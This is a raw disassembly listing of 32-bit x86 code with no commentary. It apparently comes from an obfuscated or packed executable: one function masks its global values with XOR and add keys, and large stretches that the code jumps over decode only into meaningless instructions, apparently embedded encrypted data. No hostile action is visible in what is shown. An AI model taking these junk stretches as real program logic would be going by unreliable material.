  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43366f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43362f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	cmp    eax,0xa4f68b1a
  40749a:	sar    BYTE PTR [esi+0x7e],0x20
  40749e:	jge    0x40751e
  4074a0:	jle    0x4074c7
  4074a2:	adc    esi,DWORD PTR [esi]
  4074a4:	cmp    esp,DWORD PTR ds:0x687bb39
  4074aa:	jl     0x4074f1
  4074ac:	fucomip st,st(6)
  4074ae:	mov    bh,BYTE PTR [edi]
  4074b0:	popa   
  4074b1:	lods   al,BYTE PTR ds:[esi]
  4074b2:	nop
  4074b3:	inc    eax
  4074b4:	fwait
  4074b5:	push   es
  4074b6:	lahf   
  4074b7:	sbb    ch,BYTE PTR [esi+ebx*2-0x2f8bf1a8]
  4074be:	(bad)  
  4074bf:	pop    eax
  4074c0:	jno    0x4074bd
  4074c2:	cmp    edx,DWORD PTR [eax+eiz*8-0x4e]
  4074c6:	add    esp,ecx
  4074c8:	cwde   
  4074c9:	test   al,0x2a
  4074cb:	mov    esp,0xcf793c9e
  4074d0:	mov    edi,0xe07cd8c3
  4074d5:	rcr    DWORD PTR [ecx],1
  4074d7:	and    DWORD PTR [esp+eax*1],edx
  4074da:	push   ss
  4074db:	push   ss
  4074dc:	cmp    BYTE PTR ds:0x71081a2b,0x53
  4074e3:	int    0x33
  4074e5:	aas    
  4074e6:	jo     0x4074c1
  4074e8:	imul   esp,DWORD PTR [ebx],0xffffff90
  4074eb:	pop    ecx
  4074ec:	push   esi
  4074ed:	ja     0x407556
  4074ef:	sbb    BYTE PTR [esp+eax*1+0x53],ah
  4074f3:	pop    ss
  4074f4:	jmp    0xbb2a:0xa53a081f
  4074fb:	ja     0x40748e
  4074fd:	add    al,0x36
  4074ff:	dec    ecx
  407500:	add    al,0x8
  407502:	(bad)  
  407503:	jae    0x4074fd
  407505:	push   eax
  407506:	iret   
  407507:	dec    ebx
  407508:	fbld   TBYTE PTR [esi+0x5d59bf13]
  40750e:	arpl   WORD PTR [esi-0xf],ax
  407511:	call   0x436d:0x2184371e
  407518:	lods   eax,DWORD PTR ds:[esi]
  407519:	mov    esp,0xea139da5
  40751e:	fst    DWORD PTR [ebp-0x61c8fe27]
  407524:	cmp    dl,BYTE PTR [edx+0x7f]
  407527:	adc    esp,esp
  407529:	jns    0x407559
  40752b:	xchg   esp,eax
  40752c:	lock add ax,0xd50e
  407531:	ror    DWORD PTR [ebx],cl
  407533:	ja     0x4074c9
  407535:	push   ds
  407536:	jmp    0x4074c8
  407538:	cs pop edx
  40753a:	ja     0x40758f
  40753c:	push   0xffffff87
  40753e:	inc    ebx
  40753f:	mov    edi,0x8ce2edb0
  407544:	dec    edx
  407545:	sti    
  407546:	mov    edx,0x58d28483
  40754b:	xor    eax,0x8a9e4ead
  407550:	dec    ebx
  407551:	or     BYTE PTR [eax+0x3930a104],0xc9
  407558:	xchg   DWORD PTR [edi+0x5],ecx
  40755b:	in     eax,dx
  40755c:	push   esi
  40755d:	scas   al,BYTE PTR es:[edi]
  40755e:	push   es
  40755f:	jp     0x40759e
  407561:	pusha  
  407562:	add    BYTE PTR [ebx],dl
  407564:	inc    ebx
  407565:	inc    eax
  407566:	cmp    BYTE PTR [edx+0x19],0x31
  40756a:	in     al,0xc9
  40756c:	out    0xb,al
  40756e:	pop    ss
  40756f:	xor    cl,BYTE PTR [edx-0x25]
  407572:	in     eax,0x4e
  407574:	inc    eax
  407575:	push   esp
  407576:	sbb    eax,0xe7a627b6
  40757b:	lock xor DWORD PTR [ebx-0x31],edx
  40757f:	push   0x30bcf7b7
  407584:	fs or  eax,0x2e0410c8
  40758a:	adc    bh,BYTE PTR [edx-0x178cb0c3]
  407590:	out    dx,eax
  407591:	iret   
  407592:	or     DWORD PTR [eax-0x74da6aa3],eax
  407598:	add    eax,0xb894963d
  40759d:	nop
  40759e:	arpl   dx,bp
  4075a0:	inc    edi
  4075a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075a2:	push   esp
  4075a3:	(bad)  
  4075a4:	cmp    DWORD PTR [edx-0x1c],edx
  4075a7:	out    dx,al
  4075a8:	mov    eax,ds:0xc590e663
  4075ad:	sub    eax,0x65a2358a
  4075b2:	arpl   WORD PTR [eax+0x4e],sp
  4075b5:	push   cs
  4075b6:	mov    bl,0x63
  4075b8:	jp     0x40756a
  4075ba:	fs jecxz 0x4075d1
  4075bd:	add    BYTE PTR [ebx],ah
  4075bf:	inc    esi
  4075c0:	pop    es
  4075c1:	and    eax,0xa25833f3
  4075c6:	sbb    bl,ch
  4075c8:	pushf  
  4075c9:	std    
  4075ca:	das    
  4075cb:	scas   eax,DWORD PTR es:[edi]
  4075cc:	call   0x3801:0xa0d049a
  4075d3:	mov    ds:0xe0a8b2a6,al
  4075d8:	shr    DWORD PTR [ebp-0x552c6044],0xcd
  4075df:	enter  0xbf9d,0x5c
  4075e3:	push   esp
  4075e4:	pop    es
  4075e5:	xor    DWORD PTR [ecx+0x1488f5a3],edi
  4075eb:	jnp    0x40761b
  4075ed:	retf   
  4075ee:	scas   al,BYTE PTR es:[edi]
  4075ef:	fwait
  4075f0:	popa   
  4075f1:	cs inc edx
  4075f3:	sub    esi,eax
  4075f5:	gs mov edx,0xded60756
  4075fb:	xchg   esp,eax
  4075fc:	rcr    BYTE PTR [edi+0x4c58ca40],1
  407602:	(bad)  
  407603:	aam    0x22
  407605:	sub    al,0x51
  407607:	hlt    
  407608:	adc    ebx,DWORD PTR [edx]
  40760a:	sbb    eax,0x6f527ece
  40760f:	push   edx
  407610:	sbb    eax,0x57645fc2
  407615:	and    al,0x85
  407617:	xor    DWORD PTR [edx+0x33e999db],edx
  40761d:	jmp    0x9eb88101
  407622:	add    eax,0x656ce740
  407627:	push   es
  407628:	pop    esi
  407629:	push   ds
  40762a:	popf   
  40762b:	add    eax,0x728817a3
  407630:	sbb    eax,0x45c17335
  407635:	sahf   
  407636:	mov    edi,0xffa5596a
  40763b:	or     edx,DWORD PTR [edi]
  40763d:	hlt    
  40763e:	mov    ?,WORD PTR [ebp+0x3a3ae0af]
  407644:	das    
  407645:	mov    bl,cl
  407647:	mov    cl,cl
  407649:	push   es
  40764a:	inc    edx
  40764b:	aas    
  40764c:	mov    eax,0x7ad6a538
  407651:	add    bh,BYTE PTR [esi]
  407653:	lods   al,BYTE PTR ds:[esi]
  407654:	cli    
  407655:	test   DWORD PTR [edx],edx
  407657:	out    0x2f,eax
  407659:	out    0xcb,al
  40765b:	or     ebx,DWORD PTR [ebp+0x74]
  40765e:	xchg   edx,eax
  40765f:	popa   
  407660:	adc    al,BYTE PTR [ecx+0x48505396]
  407666:	sub    dl,BYTE PTR [eax-0x1fbf7960]
  40766c:	in     al,dx
  40766d:	sub    BYTE PTR [ebp+0x26363cf0],ah
  407673:	das    
  407674:	pop    eax
  407675:	push   cs
  407676:	adc    DWORD PTR [ecx+edi*8+0x42],0xffffffbb
  40767b:	push   esi
  40767c:	retf   0xef9c
  40767f:	add    esp,DWORD PTR [ecx]
  407681:	sbb    eax,0x4a28d8b9
  407686:	cmp    edx,DWORD PTR fs:[ebx-0x78]
  40768a:	loop   0x407701
  40768c:	mov    bh,0xd7
  40768e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40768f:	mov    al,0xf4
  407691:	xor    DWORD PTR [edx+0x6002a1da],edx
  407697:	nop
  407698:	push   esi
  407699:	cmp    BYTE PTR [edx-0x7e90d437],0x95
  4076a0:	cmc    
  4076a1:	repz shl DWORD PTR [edx+0x7dba62d8],0x38
  4076a9:	call   0x96837502
  4076ae:	js     0x407637
  4076b0:	lahf   
  4076b1:	and    al,0x0
  4076b3:	adc    bh,bh
  4076b5:	jnp    0x40769c
  4076b7:	jecxz  0x40764a
  4076b9:	xchg   BYTE PTR [edi],ch
  4076bb:	adc    eax,0x60db9e95
  4076c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c1:	sbb    eax,0x237fc18a
  4076c6:	out    dx,al
  4076c7:	popa   
  4076c8:	adc    al,0xac
  4076ca:	cmc    
  4076cb:	jo     0x407739
  4076cd:	push   edx
  4076ce:	or     al,0xae
  4076d0:	pusha  
  4076d1:	or     edx,ebp
  4076d3:	or     ebx,ecx
  4076d5:	pop    esp
  4076d6:	inc    edx
  4076d7:	out    dx,eax
  4076d8:	or     al,0x9
  4076da:	adc    BYTE PTR ds:[ecx+0x66a96510],ah
  4076e1:	dec    esp
  4076e2:	jg     0x4076b7
  4076e4:	clc    
  4076e5:	imul   ebp,DWORD PTR [ecx+0x3b],0xf159df9c
  4076ec:	jae    0x407762
  4076ee:	mov    ah,0xfc
  4076f0:	push   ds
  4076f1:	cmp    al,0x5e
  4076f3:	add    al,0xab
  4076f5:	(bad)  
  4076f7:	mov    eax,0xad9ceb4e
  4076fc:	sbb    BYTE PTR [ebx-0x14],ch
  4076ff:	loop   0x4076bf
  407701:	adc    al,0x32
  407703:	out    0x34,eax
  407705:	jnp    0x407740
  407707:	data16 clc 
  407709:	clc    
  40770a:	jl     0x4076e6
  40770c:	das    
  40770d:	mov    edx,0x1793f9fb
  407712:	push   esi
  407713:	lahf   
  407714:	ins    BYTE PTR es:[edi],dx
  407715:	dec    ebp
  407716:	shl    cl,0x13
  407719:	outs   dx,BYTE PTR ds:[esi]
  40771a:	fmul   DWORD PTR [edx-0x12]
  40771d:	in     al,0x33
  40771f:	popa   
  407720:	out    dx,eax
  407721:	cmp    al,0x6f
  407723:	mov    BYTE PTR [edx],al
  407725:	mov    edx,0x26f1d3ec
  40772a:	pop    ss
  40772b:	inc    edi
  40772c:	sbb    eax,0xde488d89
  407731:	inc    ecx
  407732:	sbb    ebp,ebp
  407734:	jge    0x4076f7
  407736:	cli    
  407737:	aas    
  407738:	sbb    al,0x7f
  40773a:	jns    0x407732
  40773c:	cmp    al,0x61
  40773e:	and    al,0x3b
  407740:	lods   al,BYTE PTR ds:[esi]
  407741:	les    ebx,FWORD PTR [edx-0x1d859309]
  407747:	int3   
  407748:	mov    eax,0xe62949d0
  40774d:	call   FWORD PTR [ecx]
  40774f:	xchg   ecx,eax
  407750:	pop    es
  407751:	jne    0x4077bb
  407753:	sbb    BYTE PTR [ebx],dl
  407755:	jo     0x407707
  407757:	mov    dl,0x8e
  407759:	gs pop ebx
  40775b:	in     al,0xc9
  40775d:	push   es
  40775e:	add    BYTE PTR [edx+0x34f2a14e],al
  407764:	xchg   edx,eax
  407765:	test   DWORD PTR [edx+0x1f],edi
  407768:	cmp    bh,ah
  40776a:	push   es
  40776b:	mov    ah,0x41
  40776d:	push   cs
  40776e:	ret    0xac99
  407771:	pushf  
  407772:	push   0xffffff86
  407774:	inc    edi
  407775:	add    DWORD PTR [esi+edx*1-0x45],ebx
  407779:	jne    0x40770f
  40777b:	add    eax,DWORD PTR [ecx-0x8]
  40777e:	std    
  40777f:	repnz int3 
  407781:	or     DWORD PTR [edx-0x14ab601c],edx
  407787:	outs   dx,BYTE PTR ds:[esi]
  407788:	add    al,0x98
  40778a:	shr    edx,0x8c
  40778d:	lahf   
  40778e:	mov    ch,0xe3
  407790:	retf   
  407791:	push   cs
  407792:	mov    edi,eax
  407794:	lods   eax,DWORD PTR ss:[esi]
  407796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407797:	pop    ds
  407798:	in     al,0x36
  40779a:	fs sahf 
  40779c:	shl    DWORD PTR [edx+0x79a864a4],1
  4077a2:	xor    BYTE PTR gs:[ecx-0x37d9f2d5],cl
  4077a9:	(bad)  [ecx]
  4077ab:	and    ebx,esi
  4077ad:	pop    edx
  4077ae:	repz xchg edx,eax
  4077b0:	and    ebx,edi
  4077b2:	outs   dx,BYTE PTR ds:[esi]
  4077b3:	mov    ch,0x12
  4077b5:	inc    esi
  4077b6:	cli    
  4077b7:	shl    BYTE PTR [ebp-0x4d],1
  4077ba:	int    0xe5
  4077bc:	and    ah,al
  4077be:	icebp  
  4077bf:	mov    BYTE PTR [ebp-0x7c1b6477],al
  4077c5:	bound  edi,QWORD PTR [ebx]
  4077c7:	mov    dl,0x90
  4077c9:	xor    dh,BYTE PTR [eax-0x1c88a285]
  4077cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4077d2:	mov    DWORD PTR ds:0x4336a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	jmp    0x7ecf:0x56d411a5
  4077fb:	jle    0x40781d
  4077fd:	jge    0x40787d
  4077ff:	jle    0x407811
  407801:	scas   eax,DWORD PTR es:[edi]
  407802:	cwde   
  407803:	cmp    al,0xdb
  407805:	jg     0x40781a
  407807:	sbb    eax,0x76d4e615
  40780c:	xchg   esp,eax
  40780d:	lahf   
  40780e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40780f:	icebp  
  407810:	jmp    0x4077fb
  407812:	pop    esi
  407813:	xlat   BYTE PTR ds:[ebx]
  407814:	retf   0x19c0
  407817:	test   DWORD PTR [esi-0x5],esp
  40781a:	enter  0xa60f,0xbe
  40781e:	mov    ch,0x7
  407820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407821:	jnp    0x4077b6
  407823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407824:	add    eax,0x63ed6380
  407829:	mov    cl,0x10
  40782b:	xchg   edi,eax
  40782c:	cmp    esp,edx
  40782e:	dec    edx
  40782f:	jp     0x407825
  407831:	push   ds
  407832:	sbb    BYTE PTR [edi],0x6b
  407835:	mov    eax,edi
  407837:	mov    esp,0x28d65346
  40783c:	xchg   esi,eax
  40783d:	push   esi
  40783e:	or     ecx,DWORD PTR [eax]
  407840:	lds    esi,FWORD PTR [eax-0x5606e5df]
  407846:	sbb    DWORD PTR [ebx+0x551cdd95],0x75
  40784d:	daa    
  40784e:	fwait
  40784f:	lods   eax,DWORD PTR ds:[esi]
  407850:	pop    ss
  407851:	mov    esp,DWORD PTR [ecx]
  407853:	outs   dx,BYTE PTR ds:[esi]
  407854:	xchg   BYTE PTR [edi-0x52],bl
  407857:	fistp  QWORD PTR [ebx+0x44f0e4d2]
  40785d:	icebp  
  40785e:	stc    
  40785f:	stos   DWORD PTR es:[edi],eax
  407860:	sub    ecx,ebx
  407862:	or     al,0x46
  407864:	or     ch,bh
  407866:	stc    
  407867:	fisub  WORD PTR ds:0x4c2608e7
  40786d:	mov    bh,BYTE PTR [esp+0x70]
  407871:	mov    ebx,0x4db1b54e
  407876:	cld    
  407877:	out    0xad,eax
  407879:	ss inc ebx
  40787b:	adc    edi,ecx
  40787d:	xchg   DWORD PTR [ecx+esi*4+0x1b7031fe],eax
  407884:	mov    ebp,0xa292ed4f
  407889:	dec    eax
  40788a:	xchg   ebp,eax
  40788b:	push   esp
  40788c:	in     al,dx
  40788d:	xor    DWORD PTR [ebp+0xa],ebp
  407890:	lds    ebp,FWORD PTR [eax+0x29]
  407893:	and    eax,ebp
  407895:	retf   0xafc8
  407898:	ror    BYTE PTR [ebx+0x6951a05f],1
  40789e:	mov    ds:0x7059ed63,eax
  4078a3:	xchg   BYTE PTR [ecx-0x4cc7ea6a],cl
  4078a9:	sub    DWORD PTR [ecx],0x6254c292
  4078af:	dec    edx
  4078b0:	push   esi
  4078b1:	js     0x407835
  4078b3:	cmp    al,dl
  4078b5:	pop    ebx
  4078b6:	data16 int 0xbf
  4078b9:	aas    
  4078ba:	ror    edi,cl
  4078bc:	add    esi,esi
  4078be:	ffree  st(6)
  4078c0:	or     BYTE PTR [edi],ah
  4078c2:	int    0x39
  4078c4:	aas    
  4078c5:	es jecxz 0x407885
  4078c8:	push   ss
  4078c9:	ror    ah,1
  4078cb:	xlat   BYTE PTR ds:[ebx]
  4078cc:	pop    ebx
  4078cd:	xor    edi,DWORD PTR [edi+eax*2+0x3f]
  4078d1:	and    DWORD PTR [edi+0x464325fb],edx
  4078d7:	ins    DWORD PTR es:[edi],dx
  4078d8:	xchg   ebx,eax
  4078d9:	pop    ecx
  4078da:	outs   dx,BYTE PTR ds:[esi]
  4078db:	inc    eax
  4078dc:	sbb    eax,0xc5bd2966
  4078e1:	jp     0x40794a
  4078e3:	retf   
  4078e4:	fsub   DWORD PTR [edi]
  4078e6:	lea    edx,[ebx-0x3d79d3b1]
  4078ec:	pop    es
  4078ed:	mov    eax,ds:0xdc29a0e9
  4078f2:	(bad)  
  4078f3:	pop    ds
  4078f4:	adc    al,0x9e
  4078f6:	arpl   WORD PTR [edi+0x75],bp
  4078f9:	add    dl,BYTE PTR ds:0x728feb54
  4078ff:	jmp    0x407892
  407901:	(bad)  
  407902:	xlat   BYTE PTR ds:[ebx]
  407903:	mov    eax,ds:0x40edd8b9
  407908:	inc    esp
  407909:	stc    
  40790a:	call   0x45ac:0xdbcea0a
  407911:	clc    
  407912:	enter  0xb05c,0x8c
  407916:	mov    edi,0x43c5c824
  40791b:	lahf   
  40791c:	sub    esi,esi
  40791e:	std    
  40791f:	call   0xc9f6:0x3e3d9f49
  407926:	sub    eax,0x265d3e23
  40792b:	or     BYTE PTR [ecx],al
  40792d:	sub    BYTE PTR [edx+0x7a],bh
  407930:	mov    ch,0x4f
  407932:	pop    ebx
  407933:	dec    ebx
  407934:	jo     0x407994
  407936:	stos   BYTE PTR es:[edi],al
  407937:	imul   eax,DWORD PTR [esi-0x3c],0x37df88c7
  40793e:	ins    BYTE PTR es:[edi],dx
  40793f:	jne    0x4078e9
  407941:	lock out dx,al
  407943:	mov    esp,0xad19abe7
  407948:	xor    eax,0x2ef76103
  40794d:	push   esp
  40794e:	jge    0x4078d6
  407950:	nop
  407951:	push   eax
  407952:	dec    ebp
  407953:	and    eax,0xe6b4337a
  407958:	popf   
  407959:	mov    ah,0x76
  40795b:	scas   eax,DWORD PTR es:[edi]
  40795c:	data16 loop 0x407953
  40795f:	out    dx,al
  407960:	jnp    0x4079cc
  407962:	adc    BYTE PTR [ebx],bh
  407964:	outs   dx,BYTE PTR ds:[esi]
  407965:	jmp    0x4079ca
  407967:	fmulp  st(4),st
  407969:	cmp    ch,0x86
  40796c:	(bad)  
  40796d:	cdq    
  40796e:	retf   0x5200
  407971:	(bad)  [edi]
  407973:	ss push esi
  407975:	mov    ch,0x2c
  407977:	mov    gs,WORD PTR [ecx+0x73]
  40797a:	mov    ch,dl
  40797c:	sub    esi,DWORD PTR [ebx]
  40797e:	dec    edi
  40797f:	lar    edi,WORD PTR ds:0xddf745e1
  407986:	repz mov cl,0xb6
  407989:	gs loopne 0x407988
  40798c:	add    dh,BYTE PTR [esi-0x2]
  40798f:	pop    ss
  407990:	jnp    0x407990
  407992:	in     al,0x0
  407994:	leave  
  407995:	das    
  407996:	sti    
  407997:	and    ebx,DWORD PTR [ebp-0x2c3fdd]
  40799d:	pop    ebp
  40799e:	jecxz  0x40792b
  4079a0:	in     al,0x85
  4079a2:	stos   DWORD PTR es:[edi],eax
  4079a3:	mov    al,0xf8
  4079a5:	cmp    BYTE PTR [edi-0xd660cec],dh
  4079ab:	mov    DWORD PTR [edi-0x33df9630],ecx
  4079b1:	iret   
  4079b2:	fstp   TBYTE PTR [ebp+0x3752ed12]
  4079b8:	fs or  dh,bh
  4079bb:	or     al,0x91
  4079bd:	inc    esp
  4079be:	add    eax,0xd9c72bf0
  4079c3:	dec    ebp
  4079c4:	jae    0x407a2d
  4079c6:	mov    eax,ds:0xd183ee8
  4079cb:	mov    bh,0x28
  4079cd:	jnp    0x407991
  4079cf:	add    al,0x78
  4079d1:	xor    esi,esp
  4079d3:	cmc    
  4079d4:	out    dx,al
  4079d5:	dec    edi
  4079d6:	neg    DWORD PTR [esi+eiz*1]
  4079d9:	nop
  4079da:	(bad)  
  4079db:	mov    edx,0xf6bfc14c
  4079e0:	inc    eax
  4079e1:	xlat   BYTE PTR ds:[ebx]
  4079e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e3:	push   esi
  4079e4:	adc    ah,BYTE PTR [edi+eiz*1]
  4079e7:	popa   
  4079e8:	pop    ebx
  4079e9:	stc    
  4079ea:	mov    ecx,0xccfab5b
  4079ef:	ss sahf 
  4079f1:	mov    esi,ss
  4079f3:	(bad)  
  4079f4:	cmc    
  4079f5:	push   edx
  4079f6:	ds push esi
  4079f8:	dec    eax
  4079f9:	dec    ecx
  4079fa:	mov    edx,0x93f291c
  4079ff:	fcmovnu st,st(3)
  407a01:	pop    esi
  407a02:	xor    eax,DWORD PTR [ecx+eax*2-0x71772ed4]
  407a09:	mov    DWORD PTR [edx],ecx
  407a0b:	dec    esp
  407a0c:	lds    esp,FWORD PTR [esp+ecx*8]
  407a0f:	or     DWORD PTR [esi+ebx*8-0xc98bfe6],edx
  407a16:	push   ecx
  407a17:	mov    ch,0x33
  407a19:	push   es
  407a1a:	cmp    al,0xac
  407a1c:	in     al,dx
  407a1d:	lds    ebp,FWORD PTR [eax+0x79]
  407a20:	mul    BYTE PTR [esi]
  407a22:	or     al,0x38
  407a24:	dec    ecx
  407a25:	lock xor DWORD PTR [eax+0x31],esi
  407a29:	dec    ecx
  407a2a:	or     DWORD PTR ds:0xe9ccb04,edi
  407a30:	call   0xebb5:0x52fc3cb
  407a37:	mov    al,0xf9
  407a39:	test   edi,esp
  407a3b:	mov    edx,0xf8a31244
  407a40:	mov    al,ds:0x960715af
  407a45:	cmp    ecx,DWORD PTR [ecx]
  407a47:	mov    bl,0x75
  407a49:	(bad)  
  407a4a:	pop    edx
  407a4b:	punpcklwd mm5,DWORD PTR [ebp+0x37]
  407a4f:	mov    cl,0xba
  407a51:	test   eax,0x919ea57e
  407a56:	popa   
  407a57:	pop    edx
  407a58:	shl    DWORD PTR [edx],cl
  407a5a:	adc    al,0x9c
  407a5c:	mov    bh,0x9
  407a5e:	leave  
  407a5f:	enter  0x6060,0x66
  407a63:	push   0xffffff9e
  407a65:	mov    ecx,DWORD PTR [ebx-0x1903ed46]
  407a6b:	es jae 0x407aa0
  407a6e:	inc    edi
  407a6f:	mov    eax,ebp
  407a71:	les    ebx,FWORD PTR [esp+esi*2]
  407a74:	jbe    0x407a97
  407a76:	adc    eax,0x2794405a
  407a7b:	aad    0xb1
  407a7d:	bound  ecx,QWORD PTR [ebp+edx*8+0x39]
  407a81:	add    al,0x7b
  407a83:	(bad)  
  407a84:	sbb    bl,ch
  407a86:	cmp    BYTE PTR [eax-0x4daa2726],0x35
  407a8d:	sbb    esi,edi
  407a8f:	fmul   st,st(2)
  407a91:	xchg   BYTE PTR [eax-0x25],dh
  407a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a95:	ins    BYTE PTR es:[edi],dx
  407a96:	sub    DWORD PTR [eax+0x75],0x54
  407a9a:	dec    edi
  407a9b:	stos   DWORD PTR es:[edi],eax
  407a9c:	and    DWORD PTR [esi],esp
  407a9e:	pop    ebx
  407a9f:	imul   ebx,DWORD PTR [ecx],0xffffffc5
  407aa2:	jmp    0x35064a55
  407aa7:	shl    DWORD PTR [eax+0x12],0xec
  407aab:	mov    al,ds:0xc55dd3b2
  407ab0:	retf   0x88fd
